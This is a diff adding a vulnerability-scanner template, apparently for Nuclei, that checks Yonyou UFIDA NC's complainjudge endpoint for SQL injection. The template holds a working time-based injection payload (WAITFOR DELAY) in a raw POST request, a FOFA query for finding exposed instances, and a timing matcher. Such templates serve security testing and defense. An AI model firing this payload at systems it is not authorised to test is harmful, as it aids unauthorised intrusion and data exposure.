@@ -1,0 +1,28 @@
+id: yonyou-nc-complainjudge-sqli
+info:
+  name: 用友 UFIDA NC complainjudge - sqli
+  author: leadlife
+  severity: high
+  description: 用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。 用友NC系统/ebvp/advorappcoll/complainbilldetail和complainjudge接口的pk_complaint参数存在SQL注入，攻击者能够通过该漏洞获取泄露服务器信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/d672fb7281b8d68fde4cf142b81405f912fc51e6/%E7%94%A8%E5%8F%8BNC%E7%B3%BB%E7%BB%9Fcomplainjudge%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(XVE-2024-19043).md
+  metadata: 
+    verified: true
+    fofa-qeury: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,sqli,nc,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /ebvp/advorappcoll/complainjudge HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:6%27--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+        condition: and
